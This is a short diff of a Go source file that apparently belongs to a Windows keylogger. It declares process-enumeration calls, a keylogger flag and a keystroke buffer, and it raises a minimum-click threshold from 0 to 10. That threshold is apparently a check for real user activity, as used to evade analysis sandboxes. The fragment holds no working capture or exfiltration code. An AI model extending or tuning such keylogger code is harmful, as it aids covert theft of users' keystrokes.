@@ -41,7 +41,7 @@ var (
 	procEnumProcessModules  = modPsapi.NewProc("EnumProcessModules")
 	procGetModuleFileNameEx = modPsapi.NewProc("GetModuleFileNameExW")
 	count                   = 0
-	minClicks               = 0
+	minClicks               = 10
 	keyloggerRunning        = false
 	keyLog                  = &strings.Builder{}
 )
